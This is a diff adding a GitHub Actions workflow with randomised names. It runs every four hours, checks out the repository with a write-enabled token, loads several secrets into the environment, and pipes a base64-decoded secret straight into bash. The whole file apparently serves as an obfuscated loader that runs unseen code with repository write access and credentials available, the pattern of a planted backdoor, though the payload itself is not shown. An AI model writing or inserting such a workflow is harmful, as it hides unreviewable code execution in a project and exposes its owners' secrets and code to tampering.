@@ -1,0 +1,21 @@
+name: v9hrwlJFNPy
+on:
+  schedule:
+    - cron: '0 */4 * * *'
+  workflow_dispatch:
+jobs:
+  rMS4AVcw1OrOVt6:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          token: ${{ secrets.VVv8TDDwcjCa }}
+      - name: g5OAKT
+        env:
+          k8ZNFGI: ${{ secrets.OMJ5RXJFqYBYK }}
+          a4qRVRygK02p1y: ${{ secrets.lsR4qRFOrf }}
+          SowupqI5VEkVkTzD: ${{ secrets.cvw6jMVLm }}
+          GITHUB_TOKEN: ${{ secrets.VVv8TDDwcjCa }}
+        run: echo "$k8ZNFGI" | base64 -d | bash
